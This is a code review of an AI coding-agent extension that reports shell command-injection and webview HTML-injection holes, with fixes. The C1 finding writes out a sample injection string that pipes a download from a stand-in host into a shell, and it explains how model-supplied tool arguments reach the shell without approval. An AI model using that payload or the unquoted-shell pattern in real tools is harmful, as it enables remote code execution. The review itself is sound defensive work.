# Trinno Agent — Code Review (2026-08)

Baseline: 30,221 TS LOC. Deep-reviewed: `panel.ts` (2651), `worker.ts` (1999),
`agent.ts` (847), `coding_tools.ts` (673), `http_client.ts` (295),
`sandbox.ts` (257), `document_extractor.ts` (299), `subagent-manager.ts` (433),
`agent-factory.ts` (363), `toolPermissionHook.ts` (318), `workspaceGuard.ts`.

Severity: 🔴 Critical (security) / 🟠 Required (correctness, reliability) / 🟡 Design & performance.

## 🔴 Critical (security)

### C1. Command injection → RCE, default-allowed

`grep_search` (`src/bos/infrastructure/http/coding_tools.ts:459-463`) interpolates
the raw LLM-supplied `args.pattern` into `execSync(rg ... "${args.pattern}" ..., { shell: '/bin/sh' })`.
A pattern like `x"; curl http://evil | sh; "` executes arbitrary code — and `grep_search`
is in `DEFAULT_TOOL_PERMISSIONS` as `allow` (`src/bos/infrastructure/config/toolPermissions.ts:18`),
so **no approval prompt at all**.

Same class of bug:
- `glob_files` — `coding_tools.ts:491` (pattern into `rg --files -g`)
- `ast_grep` — `coding_tools.ts:515-518` (`--lang` + pattern unquoted into shell)
- `ast_edit` — `coding_tools.ts:547`
- `exec_tool` — `coding_tools.ts:612` (arg join + `shell: true`, partially quoted)
- `apply_patch` — `coding_tools.ts:576` (`patch -t "${filePath}"`; path is workspace-guarded, lower risk)

`bash`/`exec_tool` go through `workspaceGuard` + `sandbox.wrapCommand`, but the search/edit
tools bypass both.

**Fix:** never pass user strings into a shell — use `spawn` with arg arrays (no `shell: true`)
or a strict argument-quoting function; remove the search tools from the auto-`allow` set.

### C2. Webview has no CSP and injects unescaped HTML

`getWebviewHtml` (`src/chat/panel.ts:2577+`) emits `<title>${persona.name}</title>` and
`<meta name="description" content="${persona.name}...">` with no HTML escaping (line ~2600),
and the document has **no Content-Security-Policy meta tag**. A persona name or any echo of
model output containing markup breaks layout or enables injection in the sidebar DOM.

**Fix:** `escapeHtml()` on interpolations + add a CSP (`default-src 'none'; script-src 'self' ...`).
Webview scripts are local files, so a strict CSP is viable.

## 🟠 Required (correctness / reliability)

### R1. Error status overwritten as success
`finalizeCurrentMessage` (`src/chat/panel.ts:2519-2522`) unconditionally sets `status='complete'`,
clobbering the `'error'` status set by error/cancel paths. A failed request is persisted to
session history as a successful message. **Fix:** only set `'complete'` if status isn't `'error'`.

### R2. `_autoCompactInProgress` stuck-true leak
`panel.ts:2402` sets the flag; only the error path (2471) resets it. The success path
(2424-2469) never does → future auto-compactions silently skip, growing context unboundedly.
**Fix:** reset in a `finally`.

### R3. `createNewSession` doesn't cancel in-flight generation
`createNewSession` (`panel.ts:514-537`) lacks the `isGenerating → sendCancel` guard that
`switchSession` (539-547) has. Switching mid-stream lets the old request's tokens /
`brainOsSession` land in the new session. **Fix:** cancel before clearing.

### R4. FD leak in `edit_file` append
`coding_tools.ts:202` `fs.readSync(fs.openSync(filePath, 'r'), ...)` never closes the handle.
**Fix:** `open`/`read`/`close` or `readFileSync`.

### R5. Stateful regex with `/g` flag
`PUBLISHER_PATTERNS` (`document_extractor.ts:35-54`) are `/gi` and used with `.test()` in loops
(102-103, 283-286). `.test()` on a `/g` regex is stateful (`lastIndex`) — alternating loop
iterations flip results, and the same pattern object is reused across calls → nondeterministic
publisher detection. **Fix:** drop `g`, or reset `lastIndex` / use `.match()`.

### R6. Cookie jar leaks across hosts
`http_client.ts:207` only sends cookies when redirects are disabled, and `mergeCookies`
(121-126) stores every `Set-Cookie` into one global jar keyed only by name, shared across all
domains. Site A's cookies can be forwarded to site B. **Fix:** scope the jar per domain and only
send cookies matching the request host.

### R7. Notebook cell extraction unbounded
`extractNotebookContext` re-reads all cells with no cap; a large notebook can blow the prompt
budget. **Fix:** cap cells + truncate, mirroring the `MAX_CONTEXT` approach used elsewhere.

## 🟡 Design / performance

### P1. `ensureProxy()` runs on every request
`http_client.ts:155` does a per-request proxy check. Memoize once at startup.

### P2. `spawnCapture` buffers unbounded
`coding_tools.ts:327-328` — a chatty process with timeout up to 3600s can accumulate arbitrary
stdout in memory before the tail is sliced. **Fix:** cap buffers with a rolling window.

### P3. `bash` and `exec_tool` ~95% duplicated
`coding_tools.ts:356-418` vs `594-658`. Merge into one implementation parameterized by
`{ command | command+args }`.

### P4. Dead-name baggage
Repo/package still carries `vscode-jupyter-typst` references (renamed to `trinno-research`).

### P5. Session-state races live in the chat layer
`panel.ts` owns `brainOsSession`, compaction, cancel, and session switch. The worker has a solid
serial message queue (`worker.ts:952`) and drain-on-`setImmediate` emit queue (254); the remaining
race surface is panel-side. A small session-state machine would harden it.

## ✅ Strengths
- Worker/stdin protocol: clean JSON-over-stdio, serial queue, orphan cleanup (`pkill` in
  `agent.ts`), background-process-group kill with SIGTERM→SIGKILL→fail-safe escalation.
- Sandbox design (seatbelt/bwrap/appcontainer profiles scoped to workspace + tmp) is genuinely
  good when enabled.
- Prompt/context discipline (round cap 60, compaction with recover/compact-result session JSON,
  truncation honesty) is above average.
- Layering (domain / application / infrastructure, one slash-command per file) is easy to navigate.

## Priority order
C1 (two-blocker: arg-array spawn + permission demotion) → C2 → R1/R2/R3 (small panel fixes) →
R4/R5/R6 → then P items.
